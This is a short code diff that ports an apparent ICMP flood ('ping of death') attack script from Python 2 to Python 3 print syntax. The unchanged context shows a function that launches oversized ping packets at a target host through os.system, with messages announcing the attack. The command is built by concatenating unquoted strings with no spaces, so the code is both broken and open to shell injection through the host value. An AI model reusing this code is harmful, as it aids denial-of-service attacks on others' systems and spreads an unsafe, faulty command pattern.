@@ -26,7 +26,7 @@ def icmp_startattack():
     # recommended size 65500 which is max available for ip packet 
     
 	
-    print "Attacking the target with crafted icmp packets" 
+    print("Attacking the target with crafted icmp packets")
     # execution of the attack in the shell 
     #    t = time.time()
 	os.system("ping" + hostip + "-l" + ippacketData + "-n" + number)
@@ -41,6 +41,6 @@ def icmp_startattack():
 
 icmp_startattack()  # called the main attack execution function 
 
-print "Attack finished"
+print("Attack finished")
 #temporarily program ends 
 
